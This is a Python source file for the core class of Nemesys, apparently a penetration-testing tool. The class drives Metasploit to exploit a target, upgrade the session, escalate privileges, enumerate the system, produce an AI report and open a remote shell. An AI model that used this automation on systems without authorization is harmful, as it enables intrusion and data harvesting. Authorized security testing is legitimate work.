from nemesys.core.exploit_manager import ExploitManager
from nemesys.core.metasploit_client import MetasploitClient
from nemesys.core.privilege_escalation_manager import PrivilegeEscalationManager
from nemesys.core.security_analyzer import SecurityAnalyzer
from nemesys.core.session_manager import SessionManager
from nemesys.core.shell_interface import ShellInterface
from nemesys.core.system_enumerator import SystemEnumerator
from nemesys.utils.logger import nemesysLogger
from nemesys import __version__

class Nemesys:
    """
    The `Nemesys` class serves as the core interface for conducting security enumeration, exploitation, 
    and post-exploitation tasks. It initializes necessary components such as Metasploit interaction, 
    exploit execution, session management, privilege escalation, system enumeration, and security analysis.
    
    It connects to Metasploit, sets up various managers for exploitation, and enables a verbose mode for debugging purposes.

    Attributes:
        client (MetasploitClient): Connection object to interact with Metasploit's RPC API.
        timeout (int): Timeout duration (in seconds) for network operations.
        exploit_manager (ExploitManager): Handles the execution of exploits.
        session_manager (SessionManager): Manages active sessions and session upgrades.
        shell_interface (ShellInterface): Provides an interactive shell for direct manipulation.
        privilege_escalation_manager (PrivilegeEscalationManager): Manages privilege escalation exploits.
        system_enumerator (SystemEnumerator): Gathers critical system information from compromised machines.
        security_analyzer (SecurityAnalyzer): Generates security analysis reports using AI-based models.

    Args:
        password (str): The password for connecting to Metasploit.
        ssl (bool): Flag indicating whether to use SSL for Metasploit connection. Defaults to `True`.
        timeout (int): The timeout period (in seconds) for network operations. Defaults to `30`.
        model_id (str): Model ID for generating security analysis reports using AI. Defaults to `"llama3-70b-8192"`.
        groq_api_key (str, optional): API key for accessing Groq cloud-based AI models. Defaults to `None`.
        verbose (bool): Enables verbose logging for detailed output. Defaults to `False`.

    Methods:
        __init__: Initializes the Nemesys instance, connects to Metasploit, and sets up the necessary managers.
    """
    
    def __init__(self, password, ssl=True, timeout=30, model_id="llama3-70b-8192", groq_api_key=None, verbose=False):
        """
        Initializes the Nemesys class, establishing a connection to Metasploit, setting up managers, 
        and configuring various components for exploitation tasks.

        Parameters:
            password (str): The password for Metasploit.
            ssl (bool): Flag indicating SSL connection for Metasploit. Default is `True`.
            timeout (int): Timeout duration for network operations. Default is `30` seconds.
            model_id (str): The model ID for generating AI-based security reports. Default is `"llama3-70b-8192"`.
            groq_api_key (str, optional): Groq API key for AI processing. Default is `None`.
            verbose (bool): Enables detailed logs and output. Default is `False`.
        """
        self._print_banner()
        # Connect to Metasploit
        self.client = MetasploitClient(password, ssl).get_client()
        self.timeout = timeout

        if not self.client:
            nemesysLogger.error("❌ Connection to Metasploit failed.")
            return

        nemesysLogger.info("💀 Nemesys initialized and connected to Metasploit.")

        self.exploit_manager = ExploitManager(self.client)
        self.session_manager = SessionManager(self.client, verbose=verbose)
        self.shell_interface = ShellInterface(self.client, timeout=self.timeout)
        self.privilege_escalation_manager = PrivilegeEscalationManager(self.client, verbose=verbose)
        self.system_enumerator = SystemEnumerator(self.client)
        self.security_analyzer = SecurityAnalyzer(model_id=model_id, groq_api_key=groq_api_key)

    def run_attack(self, exploit_name, payload_name, exploit_options={}, payload_options={}, privilege_escalation_exploit=None, target=None, log_file_path=None, pdf_path="nemesys_report.pdf", json_path="nemesys_report.json"):
        """
        Executes a specific attack with the chosen exploit and payload, performs privilege escalation, and handles post-exploitation tasks.
        
        Args:
            exploit_name (str): Name of the exploit module.
            payload_name (str): Name of the payload module.
            exploit_options (dict): Options for the exploit (e.g., RHOSTS, RPORT).
            payload_options (dict): Options for the payload (e.g., LHOST, LPORT).
            privilege_escalation_exploit (str, optional): Exploit module for privilege escalation.
            target (str, optional): IP address of the target (victim).
            log_file_path (str, optional): Path where the system enumeration log will be saved.
            pdf_path (str, optional): Path to save the PDF report.
            json_path (str, optional): Path to save the JSON report.
        """
        if not self.client:
            nemesysLogger.warning("⚠️ Client is not connected.")
            return None

        # Run the initial exploit
        nemesysLogger.info(f"💥 Executing exploit: {exploit_name} with payload: {payload_name}...")

        exploit_uuid = self.exploit_manager.run(exploit_name, payload_name, exploit_options, payload_options)
        if exploit_uuid:
            # Get session ID from the exploit result
            session_id = self.session_manager.get_session_id(exploit_uuid)
            if session_id:
                # Upgrade session
                new_session_id = self.session_manager.upgrade_session(session_id)
                if new_session_id:
                    self.session_manager.list_sessions()

                    # Perform privilege escalation if exploit provided
                    if privilege_escalation_exploit and target:
                        new_session_id = self.privilege_escalation_manager.run(new_session_id, privilege_escalation_exploit, target)
                        if new_session_id:
                            self.session_manager.list_sessions()

                    # Perform system enumeration and save the log file
                    log_file_path = self.system_enumerator.enumerate_system(new_session_id, log_file_path)
                       
                    # Perform Security Analysis and generate reports
                    self.security_analyzer.generate_report(log_file_path=log_file_path, pdf_path=pdf_path, json_path=json_path)

                    # Open interactive shell for further post-exploitation
                    self.shell_interface.open_shell(new_session_id)
                else:
                    nemesysLogger.error("❌ Session upgrade failed.")
            else:
                nemesysLogger.error("❌ No session was established.")
        else:
            nemesysLogger.error("❌ Exploit execution failed.")


    def _print_banner(self):
        """
        Prints a welcome banner at the start of the program for BlackVenom.
        """
        banner = f"""
        
        ██████   █████                                                             
        ░░██████ ░░███                                                              
        ░███░███ ░███   ██████  █████████████    ██████   █████  █████ ████  █████ 
        ░███░░███░███  ███░░███░░███░░███░░███  ███░░███ ███░░  ░░███ ░███  ███░░  
        ░███ ░░██████ ░███████  ░███ ░███ ░███ ░███████ ░░█████  ░███ ░███ ░░█████ 
        ░███  ░░█████ ░███░░░   ░███ ░███ ░███ ░███░░░   ░░░░███ ░███ ░███  ░░░░███
        █████  ░░█████░░██████  █████░███ █████░░██████  ██████  ░░███████  ██████ 
        ░░░░░    ░░░░░  ░░░░░░  ░░░░░ ░░░ ░░░░░  ░░░░░░  ░░░░░░    ░░░░░███ ░░░░░░  
                                                                ███ ░███         
                                                                ░░██████          
                                                                ░░░░░░           
        Nemesys: Critical Data Harvesting and Post-Exploitation Tool (Version: {__version__})
        """
        print(banner)